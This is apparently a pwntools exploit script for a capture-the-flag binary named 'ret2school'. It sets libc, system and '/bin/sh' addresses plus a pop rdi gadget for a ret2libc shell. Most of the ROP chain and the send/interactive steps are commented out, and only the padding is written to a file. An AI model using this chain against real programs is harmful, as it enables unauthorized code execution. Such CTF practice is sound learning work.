from pwn import *
context.terminal = ['alacritty','-e']

# p = process("./ret2school")
# gdb.attach(p)

# libc = 0xf784f420
libc = 0x7f67a2e00000
system = libc + 0x4f420
bin_sh = libc + 0x1b3d88

pop_rdi = 0x400743

# payload = b'AAABBBCCCDDDEEEFFFJJJKKKL'
payload = b'AAABBBCCCDDDEEEFFFJJJKKKLLLMMMNNNOOOPPPQ'
# payload = b'AAABBBCCCDDDEEEFFFJJJKKKLLLMMMNN'
# payload += p64(pop_rdi)
# payload += p64(bin_sh)
# payload += p64(0x00000000004006d2)

# payload += p64(system)
# payload += p64(0x0)

# p.recvuntil("Send me your homework: ")
# p.send(payload)
print(payload)
with open("thing.txt", "wb") as f: f.write(payload)
# print(len(payload))
#
# p.interactive()
